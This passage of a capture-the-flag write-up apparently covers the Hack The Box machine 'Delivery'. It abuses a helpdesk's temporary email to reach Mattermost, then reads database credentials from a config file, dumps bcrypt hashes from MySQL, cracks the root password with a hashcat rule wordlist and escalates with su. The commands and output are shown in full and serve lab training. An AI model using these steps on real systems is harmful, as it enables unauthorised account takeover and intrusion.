</code></pre></div><p>There is only one page that has different in size.</p><p>I did a <code>gobuster</code> scan but find nothing useful in the results, so I&rsquo;ll move to the next prt.</p><h3 id=tcp-80---helpdeskdeliveryhtb>TCP 80 - helpdesk.delivery.htb<a class=anchor aria-hidden=true href=#tcp-80---helpdeskdeliveryhtb>#</a></h3><p>There is a helpdesk ticketing system here. At the bottom of the page it shows it is powered by <a href=https://osticket.com/>osTicket</a>.</p><p><img class=img-container src=imgs/image-20210522024708233.png alt=image-20210522024708233></p><p>The &ldquo;Open a New Ticket&rdquo; menu.</p><p><img class=img-container src=imgs/image-20210522025616599.png alt=image-20210522025616599></p><p>The &ldquo;Check Ticket Status&rdquo; menu.</p><p><img class=img-container src=imgs/image-20210522025147588.png alt=image-20210522025147588></p><h4 id=open-a-new-ticket>Open a New Ticket<a class=anchor aria-hidden=true href=#open-a-new-ticket>#</a></h4><p>According to the message at <code>http://delivery.htb/#contact-us</code>, guest user seems to be allowed to create a ticket here.</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>For unregistered users, please use our HelpDesk to get in touch with our team. 
Once you have an @delivery.htb email address, you&#39;ll be able to have access to our MatterMost server.
</code></pre></div><p>I&rsquo;ll create one.</p><p><img class=img-container src=imgs/image-20210522030005601.png alt=image-20210522030005601></p><p>Once the ticket request is submitted, it notifies that the ticket has been created.</p><p><img class=img-container src=imgs/image-20210522030208711.png alt=image-20210522030208711></p><p>Besides the ticket id, it also gives us a temporary email with domain of <code>delivery.htb</code>, and I&rsquo;ll note that:</p><ul><li>Ticket : 4709941</li><li>Email: <a href=mailto:4709941@delivery.htb>4709941@delivery.htb</a>.</li></ul><p>The created ticket can be accessed/viewed on “Check Ticket Status” menu.</p><p><img class=img-container src=imgs/image-20210522030510810.png alt=image-20210522030510810></p><h3 id=finding-vulnerabilities---exploit-db>Finding vulnerabilities - Exploit-DB<a class=anchor aria-hidden=true href=#finding-vulnerabilities---exploit-db>#</a></h3><p>The app source code is available on Github: <a href=https://github.com/osTicket/osTicket>https://github.com/osTicket/osTicket</a>. But, it seems I&rsquo;ll need an admin access to find the version.</p><p>You guess it, we can limit the search based on the box release (9 January 2021):</p><p><img class=img-container src=imgs/image-20210522031957741.png alt=image-20210522031957741></p><p>But those exploits mostly XSS that requires a user interaction and there is no indication for that in this box, so let’s move to the next one.</p><h3 id=tcp-8065--mattermost>TCP 8065 — Mattermost<a class=anchor aria-hidden=true href=#tcp-8065--mattermost>#</a></h3><p>There is an instance of Mattermost here and it requires an account.</p><p><img class=img-container src=imgs/image-20210522032634304.png alt=image-20210522032634304></p><p>Sign up is allowed, but the page clearly shows that valid email is required.</p><p><img class=img-container src=imgs/image-20210522032749098.png alt=image-20210522032749098></p><p>And here is why a valid email is required, there is a verification process.</p><p><img class=img-container src=imgs/image-20210522033006957.png alt=image-20210522033006957></p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-maildeliverer>Shell as maildeliverer<a class=anchor aria-hidden=true href=#shell-as-maildeliverer>#</a></h3><h4 id=access-to-mattermost-using-tickettrick>Access to Mattermost using TicketTrick<a class=anchor aria-hidden=true href=#access-to-mattermost-using-tickettrick>#</a></h4><p>The idea of TicketTrick here is to use the temporary email address given by the support ticket system to register on Mattermost.</p><p>For me, the previous email is: <code>4709941@delivery.htb</code>. I’ll use that to register on Mattermost.</p><p><img class=img-container src=imgs/image-20210522034638745.png alt=image-20210522034638745></p><p>The verification is sent to <code>4709941@delivery.htb</code>.</p><p><img class=img-container src=imgs/image-20210522034704297.png alt=image-20210522034704297></p><p>Back on helpdesk, I can see the verification link to activate the my previously created Mattermost account.</p><p><img class=img-container src=imgs/image-20210522034915465.png alt=image-20210522034915465></p><p>Visiting <code>http://delivery.htb:8065/do_verify_email?token=eoy11mus8h6m4hctpmwt9qw31cdsfcxzbg7noyc5gzpc6htp9e8mqe55wwewaju9&email=4709941%40delivery.htb</code> redirects back to MatterMost which confirms the email has been verified.</p><p><img class=img-container src=imgs/image-20210522035035109.png alt=image-20210522035035109></p><p>Upon logging in, I&rsquo;m able to join the Internal channel (like server on Discord). There is one channel called internal.</p><p><img class=img-container src=imgs/image-20210522035330637.png alt=image-20210522035330637></p><p>The chats from root contain a set of credentials and a few hints which indicates that they use a variant password of “PleaseSubscribe!”.</p><h4 id=ssh---maildeliverer>SSH - maildeliverer<a class=anchor aria-hidden=true href=#ssh---maildeliverer>#</a></h4><p>The credentials of maildeliverer works on SSH.</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>→ root@kali «delivery» «10.10.14.70» 
$ ssh maildeliverer@delivery.htb
...
maildeliverer@delivery.htb&#39;s password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

...
Last login: Fri May 21 14:11:23 2021 from 10.10.16.16
maildeliverer@Delivery:~$ id
uid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer)
</code></pre></div><p>The user flag is done here.</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>maildeliverer@Delivery:~$ ls -l
total 4
-r-------- 1 maildeliverer maildeliverer 33 May 21 11:21 user.txt
</code></pre></div><p><img class=img-container src=imgs/image-20210522040053221.png alt=image-20210522040053221></p><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=internal-enumeration>Internal Enumeration<a class=anchor aria-hidden=true href=#internal-enumeration>#</a></h4><p>Enumerating on <code>/opt</code> finds the Mattermost installation folder. The Mattermost config file contains the database credentials.</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>maildeliverer@Delivery:/opt/mattermost/config$ cat config.json <span class=p>|</span> grep SqlSetting -A10
    <span class=s2>&#34;SqlSettings&#34;</span>: <span class=o>{</span>
        <span class=s2>&#34;DriverName&#34;</span>: <span class=s2>&#34;mysql&#34;</span>,
        <span class=s2>&#34;DataSource&#34;</span>: <span class=s2>&#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&#34;</span>,
        <span class=s2>&#34;DataSourceReplicas&#34;</span>: <span class=o>[]</span>,
        <span class=s2>&#34;DataSourceSearchReplicas&#34;</span>: <span class=o>[]</span>,
        <span class=s2>&#34;MaxIdleConns&#34;</span>: 20,
        <span class=s2>&#34;ConnMaxLifetimeMilliseconds&#34;</span>: 3600000,
        <span class=s2>&#34;MaxOpenConns&#34;</span>: 300,
        <span class=s2>&#34;Trace&#34;</span>: false,
        <span class=s2>&#34;AtRestEncryptKey&#34;</span>: <span class=s2>&#34;n5uax3d4f919obtsp1pw1k5xetq1enez&#34;</span>,
        <span class=s2>&#34;QueryTimeout&#34;</span>: 30,
</code></pre></div><p>The credentials is <code>mmuser:Crack_The_MM_Admin_PW</code>.</p><h4 id=mysql---dump-passwords>MySQL - Dump Passwords<a class=anchor aria-hidden=true href=#mysql---dump-passwords>#</a></h4><p>With database credentials, I can connect to the MySQL service.</p><div class=highlight><pre class=chroma><code class=language-mysql data-lang=mysql><span class=n>maildeliverer</span><span class=o>@</span><span class=n>Delivery</span><span class=p>:</span><span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>mattermost</span><span class=o>/</span><span class=n>config</span><span class=err>$</span><span class=w> </span><span class=n>mysql</span><span class=w> </span><span class=n>mattermost</span><span class=w> </span><span class=o>-</span><span class=n>u</span><span class=w> </span><span class=n>mmuser</span><span class=w> </span><span class=o>-</span><span class=n>pCrack_The_MM_Admin_PW</span><span class=w>
</span><span class=w></span><span class=n>Reading</span><span class=w> </span><span class=k>table</span><span class=w> </span><span class=n>information</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=n>completion</span><span class=w> </span><span class=n>of</span><span class=w> </span><span class=k>table</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=n>names</span><span class=w>
</span><span class=w></span><span class=n>You</span><span class=w> </span><span class=n>can</span><span class=w> </span><span class=n>turn</span><span class=w> </span><span class=n>off</span><span class=w> </span><span class=n>this</span><span class=w> </span><span class=n>feature</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=n>get</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=n>quicker</span><span class=w> </span><span class=n>startup</span><span class=w> </span><span class=k>with</span><span class=w> </span><span class=o>-</span><span class=n>A</span><span class=w>
</span><span class=w>
</span><span class=w></span><span class=n>Welcome</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>MariaDB</span><span class=w> </span><span class=n>monitor</span><span class=p>.</span><span class=w>  </span><span class=n>Commands</span><span class=w> </span><span class=n>end</span><span class=w> </span><span class=k>with</span><span class=w> </span><span class=p>;</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=err>\</span><span class=n>g</span><span class=p>.</span><span class=w>
</span><span class=w></span><span class=n>Your</span><span class=w> </span><span class=n>MariaDB</span><span class=w> </span><span class=n>connection</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>is</span><span class=w> </span><span class=mi>395</span><span class=w>
</span><span class=w></span><span class=n>Server</span><span class=w> </span><span class=n>version</span><span class=p>:</span><span class=w> </span><span class=mi>10</span><span class=p>.</span><span class=mi>3</span><span class=p>.</span><span class=mi>27</span><span class=o>-</span><span class=n>MariaDB</span><span class=o>-</span><span class=mi>0</span><span class=o>+</span><span class=n>deb10u1</span><span class=w> </span><span class=n>Debian</span><span class=w> </span><span class=mi>10</span><span class=w>
</span><span class=w>
</span><span class=w></span><span class=nf>Copyright</span><span class=w> </span><span class=p>(</span><span class=n>c</span><span class=p>)</span><span class=w> </span><span class=mi>2000</span><span class=p>,</span><span class=w> </span><span class=mi>2018</span><span class=p>,</span><span class=w> </span><span class=n>Oracle</span><span class=p>,</span><span class=w> </span><span class=n>MariaDB</span><span class=w> </span><span class=n>Corporation</span><span class=w> </span><span class=n>Ab</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>others</span><span class=p>.</span><span class=w>
</span><span class=w>
</span><span class=w></span><span class=n>Type</span><span class=w> </span><span class=s1>&#39;help;&#39;</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=s1>&#39;\h&#39;</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=n>help</span><span class=p>.</span><span class=w> </span><span class=n>Type</span><span class=w> </span><span class=s1>&#39;\c&#39;</span><span class=w> </span><span class=k>to</span><span class=w> </span><span class=n>clear</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>current</span><span class=w> </span><span class=n>input</span><span class=w> </span><span class=n>statement</span><span class=p>.</span><span class=w>
</span><span class=w>
</span><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>mattermost</span><span class=p>]</span><span class=o>&gt;</span><span class=w>
</span></code></pre></div><p>There is a users table which usually contains something juicy.</p><div class=highlight><pre class=chroma><code class=language-mysql data-lang=mysql><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>mattermost</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>show</span><span class=w> </span><span class=kp>tables</span><span class=p>;</span><span class=w>
</span><span class=w></span><span class=o>+------------------------+</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>Tables_in_mattermost</span><span class=w>   </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>+------------------------+</span><span class=w>
</span><span class=w></span><span class=p>...</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>Users</span><span class=w>                  </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>+------------------------+</span><span class=w>
</span><span class=w></span><span class=mi>46</span><span class=w> </span><span class=n>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=kt>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></code></pre></div><p>I can get the columns of the table user by querying <code>describe Users;</code>.</p><div class=highlight><pre class=chroma><code class=language-mysql data-lang=mysql><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>mattermost</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>describe</span><span class=w> </span><span class=n>Users</span><span class=p>;</span><span class=w>
</span><span class=w></span><span class=o>+--------------------+--------------+------+-----+---------+-------+</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>Field</span><span class=w>              </span><span class=o>|</span><span class=w> </span><span class=n>Type</span><span class=w>         </span><span class=o>|</span><span class=w> </span><span class=no>Null</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>Key</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>Default</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>Extra</span><span class=w> </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>+--------------------+--------------+------+-----+---------+-------+</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>Id</span><span class=w>                 </span><span class=o>|</span><span class=w> </span><span class=kt>varchar</span><span class=p>(</span><span class=mi>26</span><span class=p>)</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>NO</span><span class=w>   </span><span class=o>|</span><span class=w> </span><span class=n>PRI</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=no>NULL</span><span class=w>    </span><span class=o>|</span><span class=w>       </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>CreateAt</span><span class=w>           </span><span class=o>|</span><span class=w> </span><span class=kt>bigint</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span><span class=w>   </span><span class=o>|</span><span class=w> </span><span class=n>YES</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>MUL</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=no>NULL</span><span class=w>    </span><span class=o>|</span><span class=w>       </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>UpdateAt</span><span class=w>           </span><span class=o>|</span><span class=w> </span><span class=kt>bigint</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span><span class=w>   </span><span class=o>|</span><span class=w> </span><span class=n>YES</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>MUL</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=no>NULL</span><span class=w>    </span><span class=o>|</span><span class=w>       </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>DeleteAt</span><span class=w>           </span><span class=o>|</span><span class=w> </span><span class=kt>bigint</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span><span class=w>   </span><span class=o>|</span><span class=w> </span><span class=n>YES</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>MUL</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=no>NULL</span><span class=w>    </span><span class=o>|</span><span class=w>       </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>Username</span><span class=w>           </span><span class=o>|</span><span class=w> </span><span class=kt>varchar</span><span class=p>(</span><span class=mi>64</span><span class=p>)</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>YES</span><span class=w>  </span><span class=o>|</span><span class=w> </span><span class=n>UNI</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=no>NULL</span><span class=w>    </span><span class=o>|</span><span class=w>       </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>Password</span><span class=w>           </span><span class=o>|</span><span class=w> </span><span class=kt>varchar</span><span class=p>(</span><span class=mi>128</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>YES</span><span class=w>  </span><span class=o>|</span><span class=w>     </span><span class=o>|</span><span class=w> </span><span class=no>NULL</span><span class=w>    </span><span class=o>|</span><span class=w>       </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=p>...</span><span class=w>
</span><span class=w></span><span class=o>+--------------------+--------------+------+-----+---------+-------+</span><span class=w>
</span><span class=w></span><span class=mi>25</span><span class=w> </span><span class=n>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=kt>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></code></pre></div><p>I&rsquo;ll dump that the username and password columns from the table Users.</p><div class=highlight><pre class=chroma><code class=language-mysql data-lang=mysql><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>mattermost</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>Username</span><span class=p>,</span><span class=n>Password</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>Users</span><span class=p>;</span><span class=w>
</span><span class=w></span><span class=o>+----------------------------------+--------------------------------------------------------------+</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>Username</span><span class=w>                         </span><span class=o>|</span><span class=w> </span><span class=n>Password</span><span class=w>                                                     </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>+----------------------------------+--------------------------------------------------------------+</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>surveybot</span><span class=w>                        </span><span class=o>|</span><span class=w>                                                              </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>c3ecacacc7b94f909d04dbfd308a9b93</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=err>$</span><span class=mi>2</span><span class=n>a</span><span class=err>$</span><span class=mi>10</span><span class=err>$</span><span class=n>u5815SIBe2Fq1FZlv9S8I</span><span class=p>.</span><span class=n>VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK</span><span class=w> </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=mi>5</span><span class=n>b785171bfb34762a933e127630c4860</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=err>$</span><span class=mi>2</span><span class=n>a</span><span class=err>$</span><span class=mi>10</span><span class=err>$</span><span class=mi>3</span><span class=n>m0quqyvCE8Z</span><span class=o>/</span><span class=n>R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg</span><span class=p>.</span><span class=n>HDGpS</span><span class=o>/</span><span class=n>G</span><span class=w> </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>testmail</span><span class=w>                         </span><span class=o>|</span><span class=w> </span><span class=err>$</span><span class=mi>2</span><span class=n>a</span><span class=err>$</span><span class=mi>10</span><span class=err>$</span><span class=n>gSBaz3a76sX</span><span class=p>.</span><span class=n>ikqynx4E7O2NYn9</span><span class=p>.</span><span class=n>q6fcSopTwYP672lJMSbZ6</span><span class=p>.</span><span class=n>IQa</span><span class=w> </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>help</span><span class=w>                             </span><span class=o>|</span><span class=w> </span><span class=err>$</span><span class=mi>2</span><span class=n>a</span><span class=err>$</span><span class=mi>10</span><span class=err>$</span><span class=n>zsb4KbggZbpQi2Wa8W0</span><span class=p>.</span><span class=n>C</span><span class=p>.</span><span class=n>lHVJxiUBr6cyNFbDbWu11j6JBJrVkpm</span><span class=w> </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>root</span><span class=w>                             </span><span class=o>|</span><span class=w> </span><span class=err>$</span><span class=mi>2</span><span class=n>a</span><span class=err>$</span><span class=mi>10</span><span class=err>$</span><span class=n>VM6EeymRxJ29r8Wjkr8Dtev0O</span><span class=p>.</span><span class=mi>1</span><span class=n>STWb4</span><span class=p>.</span><span class=mi>4</span><span class=n>ScG</span><span class=p>.</span><span class=n>anuu7v0EFJwgjjO</span><span class=w> </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>ff0a21fc6fc2488195e16ea854c963ee</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=err>$</span><span class=mi>2</span><span class=n>a</span><span class=err>$</span><span class=mi>10</span><span class=err>$</span><span class=n>RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS</span><span class=p>.</span><span class=n>Pduq</span><span class=w> </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>channelexport</span><span class=w>                    </span><span class=o>|</span><span class=w>                                                              </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=mi>9</span><span class=n>ecfb4be145d47fda0724f697f35ffaf</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=err>$</span><span class=mi>2</span><span class=n>a</span><span class=err>$</span><span class=mi>10</span><span class=err>$</span><span class=n>s</span><span class=p>.</span><span class=n>cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm</span><span class=w> </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>aaaa</span><span class=w>                             </span><span class=o>|</span><span class=w> </span><span class=err>$</span><span class=mi>2</span><span class=n>a</span><span class=err>$</span><span class=mi>10</span><span class=err>$</span><span class=n>yIdqqOXl</span><span class=p>.</span><span class=mi>5</span><span class=n>dcWsXk</span><span class=p>.</span><span class=n>Doo2ewl</span><span class=p>.</span><span class=n>zTFdsDd2F0</span><span class=p>.</span><span class=n>c44iWOpGMIgmDTsY6</span><span class=w> </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>iiamf</span><span class=w>                            </span><span class=o>|</span><span class=w> </span><span class=err>$</span><span class=mi>2</span><span class=n>a</span><span class=err>$</span><span class=mi>10</span><span class=err>$</span><span class=n>esA8d</span><span class=o>/</span><span class=n>l5</span><span class=p>.</span><span class=n>IKQJIhnl2SeYeeoFaCOE6Z</span><span class=o>/</span><span class=n>esUOSuRb</span><span class=p>.</span><span class=n>Vqtkf3gvbli6</span><span class=w> </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>iamf</span><span class=w>                             </span><span class=o>|</span><span class=w> </span><span class=err>$</span><span class=mi>2</span><span class=n>a</span><span class=err>$</span><span class=mi>10</span><span class=err>$</span><span class=n>ZYEM</span><span class=p>.</span><span class=n>GLMnAfq8eM</span><span class=p>.</span><span class=mi>2</span><span class=n>rs8q</span><span class=p>.</span><span class=n>e</span><span class=o>/</span><span class=n>q3bHaOVOCvlu7YGhU0rU0Ug4PME9a</span><span class=w> </span><span class=o>|</span><span class=w>
</span><span class=w></span><span class=o>+----------------------------------+--------------------------------------------------------------+</span><span class=w>
</span><span class=w></span><span class=mi>12</span><span class=w> </span><span class=n>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=kt>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>000</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span><span class=w>
</span><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>mattermost</span><span class=p>]</span><span class=o>&gt;</span><span class=w>
</span></code></pre></div><p>Those are bcrypt hashes, but let’s prioritize the root hash.</p><h4 id=cracking-the-hash>Cracking the Hash<a class=anchor aria-hidden=true href=#cracking-the-hash>#</a></h4><p>Based on the conversations on Mattermost, there is someone in the system that uses a variant of “PleaseSubscribe!” and they were talking about hashcat rules.</p><p>I remember exactly that Ippsec (the box author) has shown several techniques on how to generate a variant of seasonal passwords on <a href="https://www.youtube.com/watch?v=H9FcE_FMZio&t=730s">Forest</a> .</p><p>Now the idea is instead of generating seasonal passwords, I can try to generate a few variant of &ldquo;PleaseSubscribe!&rdquo; and use them for cracking.</p><p>So, I&rsquo;ll start by calculating the length of “PleaseSubscribe!”.</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>→ root@kali «delivery» «10.10.14.70»
$ <span class=nb>echo</span> -n <span class=s1>&#39;PleaseSubsribe!&#39;</span> <span class=p>|</span> wc -c
<span class=m>15</span>
</code></pre></div><p>It has length of 15. I&rsquo;ll save the &ldquo;PleaseSubscribe!&rdquo; string to a file.</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>→ root@kali «delivery» «10.10.14.70»
$ <span class=nb>echo</span> <span class=s1>&#39;PleaseSubscribe!&#39;</span> &gt; IppsecSubscriber
</code></pre></div><p>Then I’ll feed that file to <code>hashcat</code> to generate some new variant of it using base64 rule, and I&rsquo;ll take out only the string which has a length greater than 15 and pipe the output to a file called <code>custom_wordlist</code>.</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>
→ root@kali «delivery» «10.10.14.70»
$ hashcat IppsecSubscriber -r /usr/share/hashcat/rules/best64.rule --stdout <span class=p>|</span> awk <span class=s1>&#39;length($0) &gt; 15&#39;</span> &gt; custom_wordlist
</code></pre></div><p>It produces 46 words.</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>→ root@kali «delivery» «10.10.14.70»
$ wc -w custom_wordlist
<span class=m>46</span> custom_wordlist
</code></pre></div><p>With that wordlist the hash gets cracked instantly!</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>C:<span class=se>\t</span>ools<span class=se>\h</span>ashcat6&gt;hashcat.exe -m <span class=m>3200</span> <span class=s1>&#39;$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO&#39;</span> custom_wordlist --force

....
<span class=nv>$2</span>a<span class=nv>$10$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21

Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt <span class=nv>$2</span>*$, Blowfish <span class=o>(</span>Unix<span class=o>)</span>
Hash.Target......: <span class=nv>$2</span>a<span class=nv>$10$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v...JwgjjO
Time.Started.....: Mon Mar <span class=m>15</span> 21:36:35 <span class=m>2021</span> <span class=o>(</span><span class=m>1</span> sec<span class=o>)</span>
Time.Estimated...: Mon Mar <span class=m>15</span> 21:36:36 <span class=m>2021</span> <span class=o>(</span><span class=m>0</span> secs<span class=o>)</span>
....
</code></pre></div><p>The recovered password is <code>PleaseSubscribe!21</code>.</p><h4 id=su---root>SU - root<a class=anchor aria-hidden=true href=#su---root>#</a></h4><p>That password works on root user.</p><div class=highlight><pre class=chroma><code class=language-shell data-lang=shell>maildeliverer@Delivery:~$ su root
Password: 
root@Delivery:/home/maildeliverer# id
<span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
</code></pre></div><p>Now I can just grab the root flag.</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>root@Delivery:/home/maildeliverer# cd ~
root@Delivery:~# ls -l
total 16
-rwxr-x--- 1 root root  103 Dec 26 11:26 mail.sh
-r-------- 1 root root  382 Dec 28 07:02 note.txt
-rw-r----- 1 root root 1499 Dec 26 10:55 py-smtp.py
-r-------- 1 root root   33 May 21 11:21 root.txt
root@Delivery:~# cat *.txt
I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I&#39;ve seen several times.  The inspiration for the box is here: 

- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c 

Keep on hacking! And please don&#39;t forget to subscribe to all the security streamers out there.

- ippsec
a7d68baadc3b3c072c6...&lt;SNIP&gt;...
</code></pre></div><p>There is also a message from the <a href=https://www.youtube.com/c/ippsec/videos>box’s author</a>:</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>root@Delivery:~# cat note.txt
I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I&#39;ve seen several times. The inspiration for the box is here:

- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c

Keep on hacking! And please don&#39;t forget to subscribe to all the security streamers out there.
</code></pre></div><hr><h2 id=references>References<a class=anchor aria-hidden=true href=#references>#</a></h2><ul><li><a href=https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c>https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/tickettrick/>TicketTrick</a></li><li><a href=https://fahmifj.github.io/tags/osticket/>osTicket</a></li><li><a href=https://fahmifj.github.io/tags/mattermost/>Mattermost</a></li><li><a href=https://fahmifj.github.io/tags/password-cracking/>Password-cracking</a></li><li><a href=https://fahmifj.github.io/tags/hashcat/>Hashcat</a></li></ul><nav class=paginav><a class=prev href=https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/><span class=title>« Prev Page</span><br><span>Linux Backdoors and Where to Find Them</span></a>
